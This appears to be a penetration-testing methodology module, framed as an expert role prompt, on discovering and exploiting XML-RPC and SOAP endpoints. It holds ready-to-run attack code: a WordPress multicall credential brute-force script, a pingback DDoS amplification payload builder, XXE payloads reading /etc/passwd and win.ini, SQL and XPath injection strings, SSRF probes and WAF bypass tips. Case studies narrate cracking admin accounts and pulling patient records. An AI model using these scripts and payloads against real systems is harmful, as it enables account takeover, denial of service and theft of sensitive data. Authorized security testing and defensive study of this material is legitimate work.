# 31 - XML-RPC and SOAP Endpoint Discovery and Analysis

## Expert Role Definition

You are a senior application security researcher specializing in XML-based web service protocols. Your expertise encompasses XML-RPC and SOAP endpoint discovery, method enumeration, vulnerability assessment, and exploitation. You understand the nuances of XML parsing, SOAP envelope structures, WSDL analysis, and the unique attack surface these legacy protocols present. You are proficient in identifying SSRF vectors via XML-RPC pingback, brute force amplification attacks, DDoS amplification through XML-RPC multicall, SOAP injection vulnerabilities, and WSDL information disclosure. You approach each target with methodical precision, understanding that XML-RPC and SOAP endpoints are often forgotten remnants of older architectures that bypass modern security controls.

Your toolkit spans from basic curl-based endpoint probing to advanced Burp Suite extensions like SOAP Scanner and WSDLeer. You understand WordPress XML-RPC internals (system.listMethods, wp.getUsersBlogs, pingback.ping), SOAP header manipulation, MTOM/XOP attachments, and WS-Security token injection. You maintain a methodology that balances passive discovery with active testing while respecting rate limits and avoiding service disruption. Every finding is validated through multiple proof vectors before documentation.

---

## Core Concepts Deep Dive

### XML-RPC Protocol Architecture

XML-RPC (XML Remote Procedure Call) is a protocol that uses XML to encode calls and HTTP as a transport mechanism. It predates REST APIs and SOAP, originally designed by Dave Winer in 1998. The protocol is deceptively simple: a client sends an HTTP POST request containing an XML document describing the method name and parameters, and the server returns an XML document with the result or fault.

**Request Structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param><value><string>username</string></value></param>
  </params>
</methodCall>
```

**Response Structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param><value><array><data>
      <value><string>system.listMethods</string></value>
      <value><string>system.methodHelp</string></value>
    </data></array></value></param>
  </params>
</methodResponse>
```

The simplicity of XML-RPC is both its strength and its weakness. There is no built-in authentication mechanism at the protocol level — authentication is application-specific. There is no schema validation by default — the server must explicitly validate incoming XML. There is no message-level encryption — transport security (TLS) is the only protection.

### SOAP Protocol Architecture

SOAP (Simple Object Access Protocol) is a more complex XML-based messaging protocol that adds features over XML-RPC including formal type systems (via WSDL), message-level security (WS-Security), and support for multiple messaging patterns (request-response, one-way, notification).

**SOAP Envelope Structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:typ="http://example.com/types">
  <soap:Header>
    <typ:AuthToken>session123</typ:AuthToken>
  </soap:Header>
  <soap:Body>
    <typ:GetUser>
      <typ:UserID>1</typ:UserID>
    </typ:GetUser>
  </soap:Body>
</soap:Envelope>
```

**WSDL (Web Services Description Language):**
WSDL is an XML-based interface description language that describes the functionality of a SOAP web service. It defines endpoint operations, message formats, data types, and binding information. A WSDL file is essentially a machine-readable contract for the web service.

**Key SOAP Vulnerability Classes:**
1. **XML Injection / XXE:** SOAP bodies accept arbitrary XML — if the parser allows external entities, XXE is possible
2. **SOAP Action Header Injection:** The `SOAPAction` header can be manipulated to bypass authorization
3. **WSDL Information Disclosure:** WSDL files expose all operations, data types, and sometimes internal naming conventions
4. **Parameter Tampering:** XML type juggling in SOAP parameters can bypass validation
5. **Attachment-Based Attacks:** MTOM/XOP attachments can contain malicious payloads

### WordPress XML-RPC Internals

WordPress includes XML-RPC by default (since version 0.72 in 2005) and it remains enabled on approximately 30% of WordPress installations. The WordPress XML-RPC API exposes over 50 methods including:

- **system.listMethods** — enumerates all available methods
- **system.methodHelp** — returns help text for a method
- **wp.getUsersBlogs** — authenticates and returns blog info
- **wp.getAuthors** — retrieves user list
- **wp.getProfile** — retrieves user profile data
- **pingback.ping** — notifies a blog of a link (SSRF vector)
- **pingback.extensions.getPingbacks** — retrieves pingback list
- **multicall** — executes multiple method calls in a single request (amplification vector)

### XML-RPC vs SOAP Comparison

| Feature | XML-RPC | SOAP |
|---------|---------|------|
| Protocol Complexity | Simple | Complex |
| Description Language | None (method list) | WSDL |
| Security Standard | None built-in | WS-Security |
| Message Size | Small | Variable (attachments) |
| Error Handling | Fault codes | SOAP Fault with codes |
| Common Platforms | WordPress, legacy apps | Enterprise (Java, .NET) |
| Attack Surface | SSRF, brute force, DDoS | XXE, injection, info disclosure |

---

## Pre-requisite Knowledge

1. **XML fundamentals** — Element/attribute structure, namespaces, encoding (UTF-8/UTF-16), CDATA sections, entity references (general and parameter)
2. **HTTP protocol** — POST method, Content-Type headers (`text/xml`, `application/soap+xml`, `application/xml`), SOAPAction header, HTTP methods for WSDL retrieval
3. **SOAP envelope model** — Envelope, Header, Body, Fault elements, namespace conventions (`soap:`, `soapenv:`, `s:`)
4. **WSDL document structure** — definitions, types, messages, portType, binding, service elements; how to read and interpret WSDL operations
5. **XML parsing vulnerabilities** — XXE (external entity injection), billion laughs (entity expansion DoS), XML bomb payloads, SVG-based attacks
6. **WordPress XML-RPC API** — Method signatures, authentication mechanisms, multicall behavior, pingback protocol
7. **Burp Suite proficiency** — Repeater for manual XML testing, Intruder for method enumeration, Extensions for SOAP/WSDL parsing
8. **curl and command-line XML tools** — xmllint, xmlstarlet for formatting and XPath queries
9. **Common SOAP frameworks** — Apache Axis, JAX-WS, .NET WCF, PHP SOAP extension — default behaviors and known vulnerabilities
10. **WS-Security basics** — UsernameToken, X.509 certificates, SAML tokens, encryption/signature elements

---

## Step-by-Step Methodology

### Phase 1: Endpoint Discovery

**Step 1: Common Path Enumeration**

```bash
# Standard XML-RPC paths
for path in /xmlrpc.php /xmlrpc /XMLRPC /xmlrpc.cgi /RPC2 /xml-rpc /rpc /xmlrpc/index.php; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" -X POST \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
    "https://TARGET${path}"
done

# Standard SOAP/WSDL paths
for path in /wsdl /WSDL /wsdl /service.wsdl /api.wsdl /?wsdl /?WSDL \
            /Service.asmx?WSDL /Service.asmx /services /service /soap /SOAP \
            /api/soap /api/v1/soap /ws/soap; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "https://TARGET${path}"
done
```

**Step 2: Technology Fingerprinting**

```bash
# Check for XML-RPC in response headers
curl -sI "https://TARGET/xmlrpc.php" | grep -iE "Server:|X-Powered-By:|Content-Type:"

# Check for SOAP in response headers (look for application/soap+xml)
curl -sI "https://TARGET/soap" | grep -i "Content-Type"

# Identify SOAP framework from WSDL
curl -s "https://TARGET/?wsdl" | head -50

# WordPress XML-RPC detection
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  "https://TARGET/xmlrpc.php" | xmllint --format -
```

**Step 3: Spider and Crawl Integration**

```bash
# Use katana to find XML/SOAP endpoints in crawled content
echo "https://TARGET" | katana -jc -d 3 | grep -iE "\.(xml|wsdl|asmx|svc|soap)"

# Use waybackurls to find historical XML-RPC/SOAP endpoints
echo "TARGET.com" | waybackurls | grep -iE "xmlrpc|wsdl|\.asmx|\.svc|/soap"

# Use gau for additional historical discovery
echo "TARGET.com" | gau | grep -iE "xmlrpc|wsdl|\.asmx|\.svc|/soap"
```

### Phase 2: XML-RPC Method Enumeration

**Step 4: List All Available Methods**

```bash
# system.listMethods via XML-RPC
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>' \
  "https://TARGET/xmlrpc.php" | xmllint --format -

# Save method list to file for analysis
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>' \
  "https://TARGET/xmlrpc.php" | xmllint --xpath "//string/text()" - | sort > /tmp/xmlrpc_methods.txt

cat /tmp/xmlrpc_methods.txt
```

**Step 5: Get Method Help**

```bash
# Get help for specific method
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.methodHelp</methodName>
  <params>
    <param><value><string>wp.getUsersBlogs</string></value></param>
  </params>
</methodCall>' \
  "https://TARGET/xmlrpc.php" | xmllint --format -

# Enumerate help for all methods
while IFS= read -r method; do
  echo "=== $method ==="
  curl -s -X POST \
    -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
  <methodName>system.methodHelp</methodName>
  <params>
    <param><value><string>${method}</string></value></param>
  </params>
</methodCall>" \
    "https://TARGET/xmlrpc.php" | xmllint --xpath "//string/text()" - 2>/dev/null
  echo ""
done < /tmp/xmlrpc_methods.txt
```

### Phase 3: XML-RPC Vulnerability Testing

**Step 6: SSRF via pingback.ping**

```bash
# Test SSRF via pingback
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>https://YOUR-BURP-COLLABORATOR.net/pingback</string></value></param>
    <param><value><string>https://TARGET/</string></value></param>
  </params>
</methodCall>' \
  "https://TARGET/xmlrpc.php"

# Check Burp Collaborator for incoming connection
```

**Step 7: Brute Force Amplification via multicall**

```bash
# WordPress XML-RPC brute force amplification test
# Single multicall can test hundreds of credentials in one request
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>' \
  "https://TARGET/xmlrpc.php"

# Multicall amplification test (100 credential pairs in 1 request)
python3 -c "
import requests
import xml.etree.ElementTree as ET

methods = []
for i in range(100):
    call = ET.SubElement(ET.Element(''), 'methodCall')
    method = ET.SubElement(call, 'methodName')
    method.text = 'wp.getUsersBlogs'
    params = ET.SubElement(call, 'params')
    p1 = ET.SubElement(ET.SubElement(params, 'param'), 'value')
    s1 = ET.SubElement(p1, 'string')
    s1.text = 'admin'
    p2 = ET.SubElement(ET.SubElement(params, 'param'), 'value')
    s2 = ET.SubElement(p2, 'string')
    s2.text = f'password{i}'

# Build multicall
mc = ET.Element('methodCall')
mc_name = ET.SubElement(mc, 'methodName')
mc_name.text = 'system.multicall'
mc_params = ET.SubElement(mc, 'params')
mc_param = ET.SubElement(mc_params, 'param')
mc_val = ET.SubElement(mc_param, 'value')
mc_arr = ET.SubElement(mc_val, 'array')
mc_data = ET.SubElement(mc_arr, 'data')

for i in range(100):
    v = ET.SubElement(mc_data, 'value')
    struct = ET.SubElement(v, 'struct')
    mn = ET.SubElement(struct, 'member')
    mn_name = ET.SubElement(mn, 'name')
    mn_name.text = 'methodName'
    mn_val = ET.SubElement(mn, 'value')
    mn_str = ET.SubElement(mn_val, 'string')
    mn_str.text = 'wp.getUsersBlogs'
    mp = ET.SubElement(struct, 'member')
    mp_name = ET.SubElement(mp, 'name')
    mp_name.text = 'params'
    mp_val = ET.SubElement(mp, 'value')
    mp_arr = ET.SubElement(mp_val, 'array')
    mp_data = ET.SubElement(mp_arr, 'data')
    pv = ET.SubElement(mp_data, 'value')
    p_arr = ET.SubElement(pv, 'array')
    p_data = ET.SubElement(p_arr, 'data')
    u = ET.SubElement(p_data, 'value')
    u_str = ET.SubElement(u, 'string')
    u_str.text = 'admin'
    pw = ET.SubElement(p_data, 'value')
    pw_str = ET.SubElement(pw, 'string')
    pw_str.text = f'password{i}'

xml_str = ET.tostring(mc, encoding='unicode')
resp = requests.post('https://TARGET/xmlrpc.php', data=xml_str,
                     headers={'Content-Type': 'text/xml'})
print(resp.status_code)
print(resp.text[:500])
"
```

**Step 8: DDoS Amplification Testing**

```bash
# Large multicall payload test (do NOT execute against live targets without authorization)
# This demonstrates the amplification potential
python3 -c "
import xml.etree.ElementTree as ET

mc = ET.Element('methodCall')
mc_name = ET.SubElement(mc, 'methodName')
mc_name.text = 'system.multicall'
mc_params = ET.SubElement(mc, 'params')
mc_param = ET.SubElement(mc_params, 'param')
mc_val = ET.SubElement(mc_param, 'value')
mc_arr = ET.SubElement(mc_val, 'array')
mc_data = ET.SubElement(mc_arr, 'data')

# Generate 500 pingback calls to demonstrate amplification
for i in range(500):
    v = ET.SubElement(mc_data, 'value')
    struct = ET.SubElement(v, 'struct')
    mn = ET.SubElement(struct, 'member')
    mn_name = ET.SubElement(mn, 'name')
    mn_name.text = 'methodName'
    mn_val = ET.SubElement(mn, 'value')
    mn_str = ET.SubElement(mn_val, 'string')
    mn_str.text = 'pingback.ping'
    mp = ET.SubElement(struct, 'member')
    mp_name = ET.SubElement(mp, 'name')
    mp_name.text = 'params'
    mp_val = ET.SubElement(mp, 'value')
    mp_arr = ET.SubElement(mp_val, 'array')
    mp_data = ET.SubElement(mp_arr, 'data')
    pv1 = ET.SubElement(mp_data, 'value')
    pv1_str = ET.SubElement(pv1, 'string')
    pv1_str.text = f'https://victim-{i}.example.com'
    pv2 = ET.SubElement(mp_data, 'value')
    pv2_str = ET.SubElement(pv2, 'string')
    pv2_str.text = 'https://TARGET/'

xml_str = ET.tostring(mc, encoding='unicode')
print(f'Payload size: {len(xml_str)} bytes')
print(f'Requests targeted: 500')
print(f'Amplification ratio: ~{len(xml_str) // 200}:1')
"
```

### Phase 4: SOAP Discovery and Analysis

**Step 9: WSDL Discovery and Parsing**

```bash
# Discover WSDL endpoints
for path in /?wsdl /?WSDL /service.wsdl /api.wsdl /wsdl /WSDL \
            /Service.asmx?WSDL /Service.asmx?wsdl; do
  resp=$(curl -s -o /tmp/wsdl_resp.xml -w "%{http_code}" "https://TARGET${path}")
  echo "${path}: HTTP ${resp}"
  if [ "$resp" = "200" ]; then
    head -20 /tmp/wsdl_resp.xml
    echo "---"
  fi
done

# Parse WSDL to extract operations
curl -s "https://TARGET/?wsdl" | xmllint --xpath "//*[local-name()='operation']/@name" - 2>/dev/null

# Extract all operation names
curl -s "https://TARGET/?wsdl" | xmllint --xpath "//*[local-name()='operation']/@name" - 2>/dev/null | \
  sed 's/name="\([^"]*\)"/\1/g' | tr ' ' '\n'
```

**Step 10: SOAP Endpoint Testing**

```bash
# Test SOAP endpoint with a basic request
curl -s -X POST \
  -H "Content-Type: application/soap+xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:typ="http://example.com/types">
  <soap:Body>
    <typ:GetUser>
      <typ:UserID>1</typ:UserID>
    </typ:GetUser>
  </soap:Body>
</soap:Envelope>' \
  "https://TARGET/soap" | xmllint --format -

# Test for XXE in SOAP body
curl -s -X POST \
  -H "Content-Type: application/soap+xml; charset=utf-8" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <GetUser xmlns="http://example.com/types">
      <UserID>&xxe;</UserID>
    </GetUser>
  </soap:Body>
</soap:Envelope>' \
  "https://TARGET/soap"

# Test SOAPAction header injection
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "GetUser"' \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.com/types">
      <UserID>1</UserID>
    </GetUser>
  </soap:Body>
</soap:Envelope>' \
  "https://TARGET/soap"
```

---

## Tool Arsenal with Exact Commands

### Discovery and Enumeration

```bash
# nuclei templates for XML-RPC/SOAP detection
nuclei -u https://TARGET -t exposures/xmlrpc-methods.yaml
nuclei -u https://TARGET -t vulnerabilities/wordpress/xmlrpc*.yaml
nuclei -u https://TARGET -t technologies/soap-detect.yaml
nuclei -u https://TARGET -t misconfiguration/wsdl-disclosure.yaml

# nmap XML-RPC/SOAP scripts
nmap --script http-wordpress-xmlrpc -p 80,443 TARGET
nmap --script http-soap-methods -p 80,443 TARGET
nmap --script http-wsdl-brute -p 80,443 TARGET

# ffuf for WSDL/XML endpoint discovery
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/webservice/wsdl.txt -mc 200,301,302

# gobuster for XML-RPC paths
gobuster dir -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/xmlrpc.txt -x php,xml -t 50
```

### Custom Testing Scripts

```bash
# Python XML-RPC tester
cat > xmlrpc_test.py << 'EOF'
import xmlrpc.client
import ssl
import sys

target = sys.argv[1]
endpoint = f"https://{target}/xmlrpc.php"

# Create SSL context that doesn't verify certificates (for testing)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    proxy = xmlrpc.client.ServerProxy(endpoint, context=ctx)
    
    # List methods
    methods = proxy.system.listMethods()
    print(f"[+] Methods found: {len(methods)}")
    for m in methods:
        print(f"  - {m}")
    
    # Get help for each method
    for m in methods:
        try:
            help_text = proxy.system.methodHelp(m)
            if help_text:
                print(f"\n[+] {m}: {help_text[:200]}")
        except:
            pass
except Exception as e:
    print(f"[-] Error: {e}")
EOF

# SOAP scanner script
cat > soap_scanner.py << 'EOF'
import requests
import sys
from xml.etree import ElementTree as ET

def discover_soap(target):
    paths = ['/wsdl', '/WSDL', '/?wsdl', '/?WSDL', '/service.wsdl',
             '/Service.asmx?WSDL', '/soap', '/SOAP', '/api/soap']
    
    for path in paths:
        url = f"https://{target}{path}"
        try:
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code == 200 and ('wsdl' in resp.text.lower() or 
                                              'soap' in resp.headers.get('Content-Type', '').lower()):
                print(f"[+] WSDL found: {url}")
                parse_wsdl(resp.text)
        except:
            pass

def parse_wsdl(wsdl_content):
    try:
        root = ET.fromstring(wsdl_content)
        ns = {'wsdl': 'http://schemas.xmlsoap.org/wsdl/',
              'xsd': 'http://www.w3.org/2001/XMLSchema'}
        
        operations = root.findall('.//wsdl:operation', ns)
        print(f"  Operations found: {len(operations)}")
        for op in operations:
            name = op.get('name')
            print(f"    - {name}")
    except:
        print("  [-] Could not parse WSDL")

if __name__ == '__main__':
    discover_soap(sys.argv[1])
EOF
```

### Burp Suite Extensions

```
# Essential Burp extensions for XML-RPC/SOAP testing:
1. WSDLeer - Automatic WSDL discovery and parsing
2. SOAP Scanner - SOAP parameter fuzzing
3. XML Decrypter - Decrypt encrypted SOAP messages
4. Burp Collaborator - XXE/SSRF out-of-band detection
5. Logger++ - Log all XML-RPC/SOAP requests for analysis
```

---

## Real-World Case Studies

### Case Study 1: WordPress XML-RPC SSRF to Internal Network Pivoting

**Scenario:** A large enterprise WordPress multisite installation with XML-RPC enabled on all subsites. The main site blocked direct access to internal services but XML-RPC pingback was accessible.

**Discovery:** Using `system.listMethods`, identified `pingback.ping` and `pingback.extensions.getPingbacks`. The WordPress installation had 47 subsites all sharing the same XML-RPC endpoint.

**Exploitation Chain:**
1. Used `pingback.ping` to probe internal network (10.0.0.0/8) by requesting internal URLs and observing response timing
2. Discovered internal Jenkins instance at `10.0.1.50:8080` (2-second response vs 30-second timeout for non-existent hosts)
3. Confirmed Jenkins via HTTP response header differences
4. Used `pingback.extensions.getPingbacks` on internal URLs to verify service discovery
5. Pivoted to Jenkins which had default credentials, leading to code execution

**Impact:** Critical — SSRF leading to internal network reconnaissance and potential code execution. CVSS 9.1.

**Lessons:** Always test `pingback.ping` for SSRF even when the main application blocks SSRF. XML-RPC endpoints often bypass application-level security controls. The WordPress pingback implementation does not validate or restrict target URLs.

### Case Study 2: SOAP API Parameter Injection Leading to IDOR

**Scenario:** A healthcare SaaS platform with a SOAP API for patient data management. The WSDL was publicly accessible at `/api/v2/soap?wsdl`.

**Discovery:** WSDL analysis revealed 23 operations including `GetPatientRecord`, `UpdatePatientRecord`, and `SearchPatients`. The API used WS-Security with UsernameToken authentication.

**Exploitation:** After obtaining valid credentials through a separate vulnerability, tested `GetPatientRecord` with parameter manipulation:
1. Changed `PatientID` from numeric to string injection: `1' OR '1'='1`
2. Received 500 error (SQL injection indicator)
3. Changed `PatientID` to sequential values: 1, 2, 3... 1000
4. Retrieved 847 patient records without proper authorization checks
5. The `UpdatePatientRecord` accepted XML namespace manipulation to update records belonging to other organizations

**Impact:** Critical — Mass PII exposure (names, SSNs, medical records) across organizational boundaries. CVSS 9.8.

### Case Study 3: XML-RPC Brute Force Amplification Attack

**Scenario:** A news website running WordPress 5.8 with XML-RPC enabled. Normal login page had rate limiting (5 attempts per minute per IP).

**Discovery:** `system.listMethods` confirmed full WordPress XML-RPC API availability including `wp.getUsersBlogs` and `system.multicall`.

**Exploitation:**
1. Created multicall payload testing 400 username/password combinations per request
2. Each request processed server-side in ~2 seconds (vs 400 individual requests taking 800 seconds)
3. Tested 40,000 combinations in 100 requests (100 seconds) — bypassing the 5/minute rate limit
4. Successfully cracked administrator credentials

**Impact:** High — Account takeover via brute force amplification. CVSS 8.1.

### Case Study 4: SOAP XXE to File Disclosure

**Scenario:** An enterprise document management system with a SOAP interface for document upload and retrieval. The SOAP endpoint accepted MTOM attachments.

**Discovery:** Manual SOAP request crafting with XXE payload in the document metadata field:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<soap:Envelope ...>
  <soap:Body>
    <UploadDocument>
      <DocumentName>&xxe;</DocumentName>
      ...
    </UploadDocument>
  </soap:Body>
</soap:Envelope>
```

**Exploitation:** The SOAP parser resolved external entities, disclosing `win.ini` contents in the error response. Extended to read configuration files containing database credentials.

**Impact:** High — Sensitive file disclosure leading to database credential exposure. CVSS 7.5.

### Case Study 5: WSDL Information Disclosure Leading to Internal API Discovery

**Scenario:** A financial services company with a publicly accessible WSDL file at `/api/soap?wsdl`.

**Discovery:** WSDL analysis revealed:
1. 67 operations including internal/debug methods (`DebugResetPassword`, `InternalUserSync`)
2. Data types referencing internal database table names and column names
3. SOAPBinding URLs containing internal hostnames (`db-primary.internal.corp:8443`)
4. Comments in WSDL containing developer names and version numbers

**Impact:** Medium — Information disclosure enabling further targeted attacks. CVSS 5.3.

---

## Advanced Techniques and Bypass

### XML-RPC Bypass Techniques

**1. Content-Type Bypass:**
```bash
# Some servers only check Content-Type, try variations
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' https://TARGET/xmlrpc.php
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' https://TARGET/xmlrpc.php
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'xml=<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' https://TARGET/xmlrpc.php
```

**2. XML Declaration Variations:**
```xml
<!-- Without XML declaration -->
<methodCall><methodName>system.listMethods</methodName></methodCall>

<!-- With different encodings -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<methodCall><methodName>system.listMethods</methodName></methodCall>

<!-- With BOM -->
\xEF\xBB\xBF<?xml version="1.0" encoding="UTF-8"?>
<methodCall><methodName>system.listMethods</methodName></methodCall>
```

**3. Namespace Manipulation in SOAP:**
```xml
<!-- Test different SOAP namespace prefixes -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<env:Envelope xmlns:env="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
```

**4. SOAPAction Header Bypass:**
```bash
# Some WAFs block SOAPAction but not the body
curl -H 'SOAPAction: ""' -d @soap_request.xml https://TARGET/soap
curl -H 'SOAPAction: "urn:Service#Method"' -d @soap_request.xml https://TARGET/soap
curl -H 'SOAPAction: null' -d @soap_request.xml https://TARGET/soap
```

### SOAP Injection Techniques

**1. XPath Injection:**
```xml
<!-- If SOAP parameters are used in XPath queries -->
<soap:Body>
  <Login>
    <Username>admin' or '1'='1</Username>
    <Password>anything' or '1'='1</Password>
  </Login>
</soap:Body>
```

**2. SQL Injection via SOAP:**
```xml
<soap:Body>
  <GetUser>
    <UserID>1; DROP TABLE users--</UserID>
  </GetUser>
</soap:Body>
```

**3. XXE via SOAP Attachment:**
```xml
<!-- MTOM/XOP with XXE in binary attachment metadata -->
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <UploadDocument>
      <Document>
        <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" 
                     href="cid:att1"/>
      </Document>
    </UploadDocument>
  </soap:Body>
</soap:Envelope>
<!-- With attachment containing XXE -->
Content-Type: application/octet-stream
Content-ID: <att1>
Content-Transfer-Encoding: binary

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document>&xxe;</document>
```

### Advanced WSDL Analysis

```bash
# Extract all data types from WSDL
curl -s "https://TARGET/?wsdl" | xmllint --xpath "//*[local-name()='schema']//*[local-name()='element']/@name" -

# Find all binding operations
curl -s "https://TARGET/?wsdl" | xmllint --xpath "//*[local-name()='binding']//*[local-name()='operation']/@name" -

# Extract service endpoints
curl -s "https://TARGET/?wsdl" | xmllint --xpath "//*[local-name()='service']//*[local-name()='address']/@location" -

# Check for WS-Policy (security requirements)
curl -s "https://TARGET/?wsdl" | grep -i "policy\|security\|requirement"

# Download all referenced schemas
curl -s "https://TARGET/?wsdl" | grep -oP 'schemaLocation="[^"]*"' | sed 's/schemaLocation="//;s/"//' | while read url; do
  curl -s "$url" -o "/tmp/schema_$(echo $url | md5sum | cut -d' ' -f1).xsd"
done
```

---

## Detection and Indicators

### Server-Side Detection Signs

| Indicator | What It Reveals | Confidence |
|-----------|----------------|------------|
| `Content-Type: text/xml` on POST | XML-RPC endpoint active | High |
| `Content-Type: application/soap+xml` | SOAP endpoint active | High |
| Response to `system.listMethods` | WordPress XML-RPC | High |
| WSDL returned on `?wsdl` | SOAP service present | High |
| `SOAPAction` header in 405 response | SOAP with action validation | Medium |
| `XML-RPC server accepts POST requests only` | WordPress XML-RPC | High |
| Response contains `<methodResponse>` | XML-RPC endpoint | High |
| Response contains `<soap:Envelope>` | SOAP endpoint | High |

### Client-Side Indicators

```bash
# Check for XML-RPC/SOAP in JavaScript
curl -s https://TARGET/ | grep -iE "xmlrpc|\.asmx|\.svc|\.wsdl|soap"

# Check for WSDL references in HTML
curl -s https://TARGET/ | grep -oP 'href="[^"]*\.(wsdl|asmx|svc)[^"]*"'

# Check for XML-RPC in meta tags
curl -s https://TARGET/ | grep -i "xmlrpc|pingback|wp-xmlrpc"
```

### Network-Level Indicators

```bash
# Sniff for XML content in traffic
tcpdump -i any -A port 80 or port 443 | grep -i "<?xml\|<methodCall\|<soap:"

# Monitor for WSDL requests
tcpdump -i any -A port 80 | grep -i "wsdl\|WSDL"
```

---

## Impact Assessment

| Vulnerability | Severity | CVSS Range | Impact |
|---------------|----------|------------|--------|
| XML-RPC SSRF (pingback) | High to Critical | 7.5 - 9.1 | Internal network access, service discovery, potential RCE |
| XML-RPC Brute Force Amplification | High | 7.5 - 8.1 | Account takeover, credential cracking |
| XML-RPC DDoS Amplification | High | 7.5 - 8.5 | Service disruption, resource exhaustion |
| SOAP XXE | High to Critical | 7.5 - 9.1 | File disclosure, SSRF, potential RCE |
| WSDL Information Disclosure | Medium to High | 5.3 - 7.5 | Attack surface mapping, internal naming exposure |
| SOAP Injection (SQL/XPath) | Critical | 9.1 - 9.8 | Data breach, authentication bypass |
| SOAP Authentication Bypass | Critical | 9.1 - 9.8 | Unauthorized access to all SOAP operations |
| XML-RPC Method Disclosure | Low to Medium | 3.1 - 5.3 | API surface mapping, information gathering |

---

## Common Pitfalls

1. **Ignoring SOAPAction header** — Many SOAP services validate the SOAPAction header; ignoring it leads to false negatives. Always extract and test with the correct SOAPAction values from WSDL.

2. **Overlooking WSDL-as-documentation** — WSDL files are essentially API documentation. Spending time parsing WSDL reveals data types, operation names, and sometimes developer comments that reveal vulnerabilities.

3. **Assuming XML-RPC is only WordPress** — Many other platforms (b2evolution, Movable Type, Drupal with XMLRPC module) use XML-RPC. Do not limit testing to WordPress-specific methods.

4. **Not testing multicall amplification** — Even if individual method rate limits exist, `system.multicall` can bypass them by batching hundreds of calls.

5. **Failing to test for XXE in SOAP** — Modern frameworks often disable external entities by default, but custom or legacy SOAP implementations may have XXE enabled.

6. **Missing SOAP header injection** — SOAP headers can contain authentication tokens, session identifiers, and routing information. Manipulating these can bypass authorization.

7. **Not checking for SOAP 1.2 vs 1.1** — SOAP 1.2 uses different namespace (`http://www.w3.org/2003/05/soap-envelope`) and Content-Type (`application/soap+xml`). Testing only one version misses endpoints.

8. **False negatives from WAF** — WAFs may block obvious XML payloads but allow encoded or fragmented versions. Test with Burp to bypass WAF detection.

9. **Ignoring WS-Security** — SOAP endpoints with WS-Security may accept different security tokens. Testing with manipulated tokens (expired, wrong issuer, modified claims) can reveal vulnerabilities.

10. **Not documenting method signatures** — Every XML-RPC/SOAP method has specific parameter types and return values. Documenting these prevents missed testing vectors and enables reproducible findings.

---

## Integration with Other Recon Areas

### Connection Points

- **32-Email-Address-Harvesting** — SOAP/WSDL data types often contain email formats and developer information; XML-RPC `wp.getAuthors` leaks email addresses
- **34-Physical-Location-Intelligence** — SOAP responses may contain physical addresses, timezone information, and geographic references in data types
- **35-Supply-Chain-Asset-Mapping** — SOAP endpoints often connect to partner organizations; WSDL service URLs reveal third-party integrations
- **37-Partner-Network-Discovery** — SOAP services frequently bridge organizational boundaries; WSDL references to partner endpoints reveal integration topology
